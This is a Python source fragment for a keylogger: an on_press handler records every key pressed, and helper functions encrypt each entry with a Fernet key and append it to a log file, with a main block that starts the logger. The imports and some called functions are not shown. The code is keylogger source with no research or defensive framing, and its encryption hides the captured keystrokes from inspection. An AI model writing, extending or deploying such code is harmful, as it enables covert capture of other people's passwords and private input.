def initialize_encryption(config):
    """Initialize Fernet cipher with configuration key."""
    try:
        key = config['encryption']['key'].encode()
        if len(key) != 44:  # Fernet keys are 44 bytes long
            raise ValueError("Invalid Fernet key length")
        return Fernet(key)
    except Exception as e:
        logger.error(f"Encryption initialization failed: {e}")
        sys.exit(1)
def write_encrypted_log(cipher, log_file, data):
    """Write encrypted data to log file with timestamp."""
    try:
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] {data}"
        encrypted_data = cipher.encrypt(log_entry.encode())
        with open(log_file, 'ab') as f:
            f.write(encrypted_data + b'\n')
    except Exception as e:
        logger.error(f"Failed to write encrypted log: {e}")
def read_encrypted_log(cipher, log_file):
    """Read and decrypt log file contents."""
    try:
        with open(log_file, 'rb') as f:
            for line in f:
                if line.strip():
                    decrypted = cipher.decrypt(line.strip()).decode()
                    print(decrypted)
    except Exception as e:
        logger.error(f"Failed to read encrypted log: {e}")
def on_press(key):
    """Handle encrypted key press logging."""
    try:
        key_str = str(key).replace("'", "")  # Sanitize key input
        write_encrypted_log(
            cipher, 
            config['logging']['file'], 
            f"Key pressed: {key_str}"
        )
    except Exception as e:
        logger.error(f"Error handling key press: {e}")
# Initialize encryption at startup
if __name__ == "__main__":
    config = load_config()
    cipher = initialize_encryption(config)
    # Example usage
    write_encrypted_log(cipher, config['logging']['file'], "System started")
    start_keylogger(config['logging']['file'])